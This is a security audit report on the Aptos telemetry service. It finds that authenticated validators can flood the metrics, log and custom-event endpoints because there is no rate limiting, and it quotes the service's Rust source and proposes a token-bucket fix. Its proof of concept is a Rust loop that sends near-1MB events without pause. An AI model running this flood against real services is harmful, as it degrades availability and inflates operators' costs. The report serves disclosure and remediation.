# Audit Report

## Title
Missing Server-Side Rate Limiting Allows Authenticated Validators to Flood Telemetry Service with Unlimited Requests

## Summary
The Aptos telemetry service lacks per-validator rate limiting on its ingestion endpoints, allowing any authenticated validator to submit unlimited telemetry data and potentially cause resource exhaustion, backend system overload, and excessive operational costs.

## Finding Description

The telemetry service accepts three types of data submissions from authenticated validators:
1. Prometheus metrics (`/api/v1/ingest/metrics`)
2. Log batches (`/api/v1/ingest/logs`)  
3. Custom events (`/api/v1/ingest/custom-event`)

While validators must authenticate via JWT tokens obtained through a noise handshake protocol, [1](#0-0)  there is **no server-side rate limiting** applied to these authenticated ingestion endpoints.

The routing configuration shows no rate limiting middleware is applied: [2](#0-1) 

The service only enforces a per-request content size limit of 1MB: [3](#0-2) 

Critically, the `aptos-telemetry-service` does not include any rate limiting library as a dependency: [4](#0-3) 

Each handler processes requests without tracking submission frequency per peer_id:
- Metrics ingestion: [5](#0-4) 
- Log ingestion: [6](#0-5) 
- Custom events: [7](#0-6) 

**Attack Path:**
1. Attacker controls a validator node (compromised or malicious)
2. Validator authenticates normally to obtain valid JWT token
3. Validator sends unlimited requests (up to 1MB each) at maximum rate
4. Service accepts all requests without throttling
5. Backend systems (BigQuery, VictoriaMetrics, Humio/Loki) receive flood of data

## Impact Explanation

**Severity Assessment: Medium**

This vulnerability does not directly impact blockchain consensus, state integrity, or validator operations. However, it creates significant operational risks:

1. **Resource Exhaustion**: The telemetry service can be overwhelmed, degrading performance for legitimate validators
2. **Backend System Overload**: Downstream systems may struggle under excessive load
3. **Cost Amplification**: BigQuery charges per data ingested; unlimited ingestion causes unbounded costs
4. **Operational Disruption**: Legitimate telemetry may be lost or delayed if service is degraded

While this is an auxiliary service, it provides critical observability for network operations. The lack of rate limiting violates the **Resource Limits** invariant principle that "all operations must respect gas, storage, and computational limits."

## Likelihood Explanation

**Likelihood: Medium to High**

- **Attack Prerequisites**: Requires control of an authenticated validator node (not necessarily a majority stake)
- **Attack Complexity**: Trivial - simply send requests in a loop
- **Detection Difficulty**: May be mistaken for legitimate high-volume telemetry
- **Motivation**: Relatively low for profit-motivated attackers, but could be used for disruption or to increase operational costs for the network

The attack is straightforward to execute and requires no special privileges beyond being an authenticated validator.

## Recommendation

Implement server-side rate limiting using a token bucket algorithm per validator peer_id. Add the rate limiter as a middleware filter before authentication:

```rust
// Add to Cargo.toml
aptos-rate-limiter = { workspace = true }

// In lib.rs or a new rate_limit.rs module
use aptos_rate_limiter::rate_limit::TokenBucketRateLimiter;
use std::sync::Arc;

pub struct TelemetryRateLimiter {
    // Per-peer rate limiters: peer_id -> rate limiter
    limiters: Arc<RwLock<HashMap<PeerId, TokenBucketRateLimiter>>>,
    max_requests_per_second: u64,
    bucket_size: u64,
}

impl TelemetryRateLimiter {
    pub fn new(max_requests_per_second: u64, bucket_size: u64) -> Self {
        Self {
            limiters: Arc::new(RwLock::new(HashMap::new())),
            max_requests_per_second,
            bucket_size,
        }
    }
    
    pub async fn check_rate_limit(&self, peer_id: PeerId) -> Result<(), RateLimitError> {
        let mut limiters = self.limiters.write();
        let limiter = limiters.entry(peer_id).or_insert_with(|| {
            TokenBucketRateLimiter::new(self.max_requests_per_second, self.bucket_size)
        });
        
        if limiter.try_consume(1) {
            Ok(())
        } else {
            Err(RateLimitError::LimitExceeded(peer_id))
        }
    }
}

// Apply as middleware in index.rs after auth but before handlers
```

**Configuration Recommendations:**
- Set per-validator limits: 100 requests/second (burst: 200)
- Different limits for different endpoint types if needed
- Implement cleanup for idle peer_ids to prevent memory leaks
- Add metrics for rate limit hits to monitor abuse

## Proof of Concept

```rust
// Rust PoC - Flood telemetry service with unlimited requests
use aptos_telemetry_service::types::telemetry::{TelemetryDump, TelemetryEvent};
use reqwest::Client;
use std::collections::BTreeMap;

#[tokio::main]
async fn main() {
    let client = Client::new();
    let telemetry_service_url = "https://telemetry-service.example.com/api/v1";
    
    // Step 1: Authenticate (assume we have validator keys)
    let jwt_token = authenticate_as_validator(&client, telemetry_service_url).await;
    
    // Step 2: Flood with unlimited requests
    let mut request_count = 0;
    loop {
        // Create maximum-size payload (1MB)
        let events = vec![TelemetryEvent {
            name: "flood_event".to_string(),
            params: BTreeMap::from([
                ("data".to_string(), "x".repeat(1_000_000)), // Near 1MB
            ]),
        }];
        
        let payload = TelemetryDump {
            client_id: "malicious_validator".to_string(),
            user_id: "validator_peer_id".to_string(),
            timestamp_micros: "1234567890".to_string(),
            events,
        };
        
        // No rate limiting - this succeeds indefinitely
        let response = client
            .post(&format!("{}/ingest/custom-event", telemetry_service_url))
            .bearer_auth(&jwt_token)
            .json(&payload)
            .send()
            .await;
            
        request_count += 1;
        if request_count % 1000 == 0 {
            println!("Sent {} requests without rate limiting", request_count);
        }
        
        // No delay - send as fast as possible
    }
}

async fn authenticate_as_validator(client: &Client, url: &str) -> String {
    // Implement noise handshake and JWT token retrieval
    // (Details omitted - use standard validator authentication flow)
    "jwt_token_from_auth".to_string()
}
```

## Notes

While the telemetry service is an auxiliary observability component and not part of core consensus, the lack of rate limiting represents a security hygiene issue that violates the principle of resource limits. Authenticated validators should not have unlimited ability to consume service resources. Implementing per-validator rate limiting is a standard best practice for any authenticated API service.

### Citations

**File:** crates/aptos-telemetry-service/src/auth.rs (L31-175)
```rust
pub async fn handle_auth(context: Context, body: AuthRequest) -> Result<impl Reply, Rejection> {
    debug!("received auth request: {:?}", body);

    let client_init_message = &body.handshake_msg;

    // Check whether the client (validator) is using the correct server's public key, which the
    // client includes in its request body.
    // This is useful for returning a refined error response to the client if it is using an
    // invalid server public key.
    if body.server_public_key != context.noise_config().public_key() {
        return Err(reject::custom(ServiceError::bad_request(
            ServiceErrorCode::AuthError(AuthError::InvalidServerPublicKey, body.chain_id),
        )));
    }

    // build the prologue (chain_id | peer_id | public_key)
    const CHAIN_ID_LENGTH: usize = 1;
    const ID_SIZE: usize = CHAIN_ID_LENGTH + PeerId::LENGTH;
    const PROLOGUE_SIZE: usize = CHAIN_ID_LENGTH + PeerId::LENGTH + x25519::PUBLIC_KEY_SIZE;
    let mut prologue = [0; PROLOGUE_SIZE];
    prologue[..CHAIN_ID_LENGTH].copy_from_slice(&[body.chain_id.id()]);
    prologue[CHAIN_ID_LENGTH..ID_SIZE].copy_from_slice(body.peer_id.as_ref());
    prologue[ID_SIZE..PROLOGUE_SIZE].copy_from_slice(body.server_public_key.as_slice());

    let (remote_public_key, handshake_state, _payload) = context
        .noise_config()
        .parse_client_init_message(&prologue, client_init_message)
        .map_err(|e| {
            debug!("error performing noise handshake: {}", e);
            reject::custom(ServiceError::bad_request(ServiceErrorCode::AuthError(
                AuthError::NoiseHandshakeError(e),
                body.chain_id,
            )))
        })?;

    let cache = if body.role_type == RoleType::Validator {
        context.peers().validators()
    } else {
        context.peers().validator_fullnodes()
    };

    let (epoch, peer_role) = match cache.read().get(&body.chain_id) {
        Some((epoch, peer_set)) => {
            match peer_set.get(&body.peer_id) {
                Some(peer) => {
                    let remote_public_key = &remote_public_key;
                    if !peer.keys.contains(remote_public_key) {
                        warn!("peer found in peer set but public_key is not found. request body: {}, role_type: {}, peer_id: {}, received public_key: {}", body.chain_id, body.role_type, body.peer_id, remote_public_key);
                        return Err(reject::custom(ServiceError::forbidden(
                            ServiceErrorCode::AuthError(
                                AuthError::PeerPublicKeyNotFound,
                                body.chain_id,
                            ),
                        )));
                    }
                    Ok((*epoch, peer.role))
                },
                None => {
                    // if not, verify that their peerid is constructed correctly from their public key
                    let derived_remote_peer_id =
                        aptos_types::account_address::from_identity_public_key(remote_public_key);
                    if derived_remote_peer_id != body.peer_id {
                        return Err(reject::custom(ServiceError::forbidden(
                            ServiceErrorCode::AuthError(
                                AuthError::PublicKeyMismatch,
                                body.chain_id,
                            ),
                        )));
                    } else {
                        Ok((*epoch, PeerRole::Unknown))
                    }
                },
            }
        },
        None => {
            warn!(
                "Validator set unavailable for Chain ID {}. Rejecting request.",
                body.chain_id
            );
            Err(reject::custom(ServiceError::unauthorized(
                ServiceErrorCode::AuthError(AuthError::ValidatorSetUnavailable, body.chain_id),
            )))
        },
    }?;

    let node_type = match peer_role {
        PeerRole::Validator => NodeType::Validator,
        PeerRole::ValidatorFullNode => NodeType::ValidatorFullNode,
        PeerRole::Unknown => match body.role_type {
            RoleType::Validator => NodeType::UnknownValidator,
            RoleType::FullNode => context
                .peers()
                .public_fullnodes()
                .get(&body.chain_id)
                .and_then(|peer_set| {
                    if peer_set.contains_key(&body.peer_id) {
                        Some(NodeType::PublicFullNode)
                    } else {
                        None
                    }
                })
                .unwrap_or(NodeType::UnknownFullNode),
        },
        _ => NodeType::Unknown,
    };

    let token = create_jwt_token(
        context.jwt_service(),
        body.chain_id,
        body.peer_id,
        node_type,
        epoch,
        body.run_uuid,
    )
    .map_err(|e| {
        error!("unable to create jwt token: {}", e);
        reject::custom(ServiceError::internal(ServiceErrorCode::AuthError(
            AuthError::from(e),
            body.chain_id,
        )))
    })?;

    let mut rng = rand::rngs::OsRng;
    let response_payload = token.as_bytes();
    let mut server_response = vec![0u8; noise::handshake_resp_msg_len(response_payload.len())];
    context
        .noise_config()
        .respond_to_client(
            &mut rng,
            handshake_state,
            Some(response_payload),
            &mut server_response,
        )
        .map_err(|e| {
            error!("unable to complete handshake {}", e);
            ServiceError::internal(ServiceErrorCode::AuthError(
                AuthError::NoiseHandshakeError(e),
                body.chain_id,
            ))
        })?;

    Ok(reply::json(&AuthResponse {
        handshake_msg: server_response,
    }))
}
```

**File:** crates/aptos-telemetry-service/src/index.rs (L26-58)
```rust
pub fn routes(
    context: Context,
) -> impl Filter<Extract = (impl Reply,), Error = Infallible> + Clone {
    let v1_api_prefix = warp::path!("api" / "v1" / ..);

    let v1_api = v1_api_prefix.and(
        index(context.clone())
            .or(health())
            .or(auth::check_chain_access(context.clone()))
            .or(auth::auth(context.clone()))
            .or(custom_event::custom_event_ingest(context.clone()))
            .or(prometheus_push_metrics::metrics_ingest(context.clone()))
            .or(log_ingest::log_ingest(context.clone()))
            .or(remote_config::telemetry_log_env(context.clone()))
            // custom contract auth endpoints
            .or(custom_contract_auth::auth_challenge(context.clone()))
            .or(custom_contract_auth::auth(context.clone()))
            .or(custom_contract_ingest::metrics_ingest(context.clone()))
            .or(custom_contract_ingest::log_ingest(context.clone()))
            .or(custom_contract_ingest::custom_event_ingest(context)),
    );

    v1_api
        .recover(handle_rejection)
        .with(warp::trace::trace(|info| {
            let trace_id = info.request_headers()
                .get(GCP_CLOUD_TRACE_CONTEXT_HEADER)
                .and_then(|header_value| header_value.to_str().ok().and_then(|trace_value| trace_value.split_once('/').map(|parts| parts.0)))
                .unwrap_or_default();
            let span = tracing::debug_span!("request", method=%info.method(), path=%info.path(), trace_id=trace_id);
            span
        }))
}
```

**File:** crates/aptos-telemetry-service/src/constants.rs (L4-5)
```rust
/// The maximum content length to accept in the http body.
pub const MAX_CONTENT_LENGTH: u64 = 1024 * 1024;
```

**File:** crates/aptos-telemetry-service/Cargo.toml (L18-53)
```text
[dependencies]
anyhow = { workspace = true }
aptos-config = { workspace = true }
aptos-crypto = { workspace = true }
aptos-infallible = { workspace = true }
aptos-logger = { workspace = true }
aptos-metrics-core = { workspace = true }
aptos-rest-client = { workspace = true }
aptos-types = { workspace = true }
base64 = { workspace = true }
bcs = { workspace = true }
chrono = { workspace = true }
clap = { workspace = true }
debug-ignore = { workspace = true }
flate2 = { workspace = true }
futures = { workspace = true }
gcp-bigquery-client = { workspace = true }
jsonwebtoken = { workspace = true }
once_cell = { workspace = true }
prometheus = { workspace = true }
prost = { workspace = true }
rand = { workspace = true }
rand_core = { workspace = true }
reqwest = { workspace = true }
reqwest-middleware = { workspace = true }
reqwest-retry = { workspace = true }
serde = { workspace = true }
serde_json = { workspace = true }
serde_yaml = { workspace = true }
snap = "1.1"
thiserror = { workspace = true }
tokio = { workspace = true }
tracing = { workspace = true }
url = { workspace = true }
uuid = { workspace = true }
warp = { workspace = true }
```

**File:** crates/aptos-telemetry-service/src/prometheus_push_metrics.rs (L40-156)
```rust
pub async fn handle_metrics_ingest(
    context: Context,
    claims: Claims,
    encoding: Option<String>,
    metrics_body: Bytes,
) -> anyhow::Result<impl Reply, Rejection> {
    debug!("handling prometheus metrics ingest");

    let enable_location_labels = env::var("FEATURE_LOCATION_LABELS_ENABLED")
        .map(|val| val.parse::<bool>().unwrap_or(false))
        .unwrap_or(false);

    let enable_random_label = env::var("FEATURE_RANDOM_LABEL_ENABLED")
        .map(|val| val.parse::<bool>().unwrap_or(false))
        .unwrap_or(false);

    let max_random_value = env::var("FEATURE_RANDOM_LABEL_MAX_VALUE")
        .map(|val| val.parse::<i32>().unwrap_or(20))
        .unwrap_or(20);

    let mut extra_labels = claims_to_extra_labels(
        &claims,
        context
            .peer_identities()
            .get(&claims.chain_id)
            .and_then(|peers| peers.get(&claims.peer_id)),
    );
    if enable_location_labels {
        extra_labels.extend_from_slice(&peer_location_labels(&context, &claims.peer_id));
    }

    let extra_labels_with_random_label = if enable_random_label {
        let random_num = rand::thread_rng().gen_range(0, max_random_value);
        let mut labels = extra_labels.clone();
        labels.push(format!("random_label={}", random_num));
        labels
    } else {
        extra_labels.clone()
    };

    let client = match claims.node_type {
        NodeType::UnknownValidator | NodeType::UnknownFullNode => {
            &context.metrics_client().untrusted_ingest_metrics_clients
        },
        _ => &context.metrics_client().ingest_metrics_client,
    };

    let start_timer = Instant::now();

    let post_futures = client.iter().map(|(name, client)| async {
        let extra_labels = if client.is_selfhosted_vm_client() {
            extra_labels_with_random_label.clone()
        } else {
            extra_labels.clone()
        };
        let result = tokio::time::timeout(
            Duration::from_secs(MAX_METRICS_POST_WAIT_DURATION_SECS),
            client.post_prometheus_metrics(
                metrics_body.clone(),
                extra_labels.clone(),
                encoding.clone().unwrap_or_default(),
            ),
        )
        .await;

        match result {
            Ok(Ok(res)) => {
                METRICS_INGEST_BACKEND_REQUEST_DURATION
                    .with_label_values(&[&claims.peer_id.to_string(), name, res.status().as_str()])
                    .observe(start_timer.elapsed().as_secs_f64());
                if res.status().is_success() {
                    debug!("remote write to victoria metrics succeeded");
                } else {
                    error!(
                        "remote write failed to victoria_metrics for client {}: {}",
                        name.clone(),
                        res.error_for_status().err().unwrap()
                    );
                    return Err(());
                }
            },
            Ok(Err(err)) => {
                METRICS_INGEST_BACKEND_REQUEST_DURATION
                    .with_label_values(&[&claims.peer_id.to_string(), name, "Unknown"])
                    .observe(start_timer.elapsed().as_secs_f64());
                error!(
                    "error sending remote write request for client {}: {}",
                    name.clone(),
                    err
                );
                return Err(());
            },
            Err(err) => {
                error!(
                    "timed out sending remote write for client {}: {}",
                    name.clone(),
                    err
                );
                return Err(());
            },
        }
        Ok(())
    });

    #[allow(clippy::unnecessary_fold)]
    if futures::future::join_all(post_futures)
        .await
        .iter()
        .all(|result| result.is_err())
    {
        return Err(reject::custom(ServiceError::internal(
            MetricsIngestError::IngestionError.into(),
        )));
    }

    Ok(reply::with_status(reply::reply(), StatusCode::CREATED))
}
```

**File:** crates/aptos-telemetry-service/src/log_ingest.rs (L41-138)
```rust
pub async fn handle_log_ingest(
    context: Context,
    claims: Claims,
    encoding: Option<String>,
    body: impl Buf,
) -> anyhow::Result<impl Reply, Rejection> {
    debug!("handling log ingest");

    if let Some(blacklist) = &context.log_ingest_clients().blacklist {
        if blacklist.contains(&claims.peer_id) {
            return Err(reject::custom(ServiceError::forbidden(
                LogIngestError::Forbidden(claims.peer_id).into(),
            )));
        }
    }

    let client = match claims.node_type {
        NodeType::Unknown | NodeType::UnknownValidator | NodeType::UnknownFullNode => {
            &context.log_ingest_clients().unknown_logs_ingest_client
        },
        _ => &context.log_ingest_clients().known_logs_ingest_client,
    };

    let log_messages: Vec<String> = if let Some(encoding) = encoding {
        if encoding.eq_ignore_ascii_case("gzip") {
            let decoder = GzDecoder::new(body.reader());
            serde_json::from_reader(decoder).map_err(|e| {
                debug!("unable to decode and deserialize body: {}", e);
                ServiceError::bad_request(LogIngestError::UnexpectedPayloadBody.into())
            })?
        } else {
            return Err(reject::custom(ServiceError::bad_request(
                LogIngestError::UnexpectedContentEncoding.into(),
            )));
        }
    } else {
        serde_json::from_reader(body.reader()).map_err(|e| {
            error!("unable to deserialize body: {}", e);
            ServiceError::bad_request(LogIngestError::UnexpectedPayloadBody.into())
        })?
    };

    let mut fields = HashMap::new();
    fields.insert(PEER_ID_FIELD_NAME.into(), claims.peer_id.to_string());
    fields.insert(EPOCH_FIELD_NAME.into(), claims.epoch.to_string());

    let mut tags = HashMap::new();
    let chain_name = if claims.chain_id.id() == 3 {
        format!("{}", claims.chain_id.id())
    } else {
        format!("{}", claims.chain_id)
    };
    tags.insert(CHAIN_ID_TAG_NAME.into(), chain_name);
    tags.insert(PEER_ROLE_TAG_NAME.into(), claims.node_type.to_string());
    tags.insert(RUN_UUID_TAG_NAME.into(), claims.run_uuid.to_string());

    let unstructured_log = UnstructuredLog {
        fields,
        tags,
        messages: log_messages,
    };

    debug!("ingesting to humio: {:?}", unstructured_log);

    let start_timer = Instant::now();

    let res = client.ingest_unstructured_log(unstructured_log).await;

    match res {
        Ok(res) => {
            LOG_INGEST_BACKEND_REQUEST_DURATION
                .with_label_values(&[res.status().as_str()])
                .observe(start_timer.elapsed().as_secs_f64());
            if res.status().is_success() {
                debug!("log ingested into humio succeessfully");
            } else {
                error!(
                    "humio log ingestion failed: {}",
                    res.error_for_status().err().unwrap()
                );
                return Err(reject::custom(ServiceError::bad_request(
                    LogIngestError::IngestionError.into(),
                )));
            }
        },
        Err(err) => {
            LOG_INGEST_BACKEND_REQUEST_DURATION
                .with_label_values(&["Unknown"])
                .observe(start_timer.elapsed().as_secs_f64());
            error!("error sending log ingest request: {}", err);
            return Err(reject::custom(ServiceError::bad_request(
                LogIngestError::IngestionError.into(),
            )));
        },
    }

    Ok(reply::with_status(reply::reply(), StatusCode::CREATED))
}
```

**File:** crates/aptos-telemetry-service/src/custom_event.rs (L67-155)
```rust
pub(crate) async fn handle_custom_event(
    context: Context,
    claims: Claims,
    mut body: TelemetryDump,
    forwarded_for: Option<String>,
) -> anyhow::Result<impl Reply, Rejection> {
    validate_custom_event_body(&claims, &body)?;

    let mut insert_request = TableDataInsertAllRequest::new();

    let client_ip = forwarded_for
        .as_ref()
        .and_then(|xff| xff.split(',').next())
        .unwrap_or("UNKNOWN");

    let telemetry_event = &mut body.events[0];
    telemetry_event
        .params
        .insert(IP_ADDRESS_KEY.into(), client_ip.into());

    let event_params: Vec<serde_json::Value> = telemetry_event
        .params
        .iter()
        .map(|(k, v)| {
            json!({
                "key": k,
                "value": v
            })
        })
        .collect();

    let duration =
        Duration::from_micros(body.timestamp_micros.as_str().parse::<u64>().map_err(|_| {
            ServiceError::bad_request(
                CustomEventIngestError::InvalidTimestamp(body.timestamp_micros).into(),
            )
        })?);

    let row = BigQueryRow {
        event_identity: EventIdentity::from(claims),
        event_name: telemetry_event.name.clone(),
        event_timestamp: duration.as_secs(),
        event_params,
    };

    insert_request.add_row(None, &row).map_err(|e| {
        error!("unable to create row: {}", e);
        ServiceError::internal(CustomEventIngestError::from(e).into())
    })?;

    let start_timer = Instant::now();

    context
        .bigquery_client()
        .ok_or_else(|| {
            error!("big query client is not configured");
            ServiceError::internal(
                CustomEventIngestError::from(anyhow!("BQ client is not configured")).into(),
            )
        })?
        .insert_all(insert_request)
        .await
        .map_err(|e| {
            BIG_QUERY_BACKEND_REQUEST_DURATION
                .with_label_values(&["request_error"])
                .observe(start_timer.elapsed().as_millis() as f64);
            error!("unable to insert row into bigquery: {}", e);
            ServiceError::internal(CustomEventIngestError::from(e).into())
        })
        .and_then(|result| {
            if let Some(err) = result.insert_errors {
                BIG_QUERY_BACKEND_REQUEST_DURATION
                    .with_label_values(&["insert_error"])
                    .observe(start_timer.elapsed().as_secs_f64());
                Err(ServiceError::bad_request(
                    CustomEventIngestError::from(err[0].clone()).into(),
                ))
            } else {
                BIG_QUERY_BACKEND_REQUEST_DURATION
                    .with_label_values(&["success"])
                    .observe(start_timer.elapsed().as_secs_f64());
                Ok(result)
            }
        })?;

    debug!("row inserted succeefully: {:?}", &row);

    Ok(reply::with_status(reply::reply(), StatusCode::CREATED))
}
```
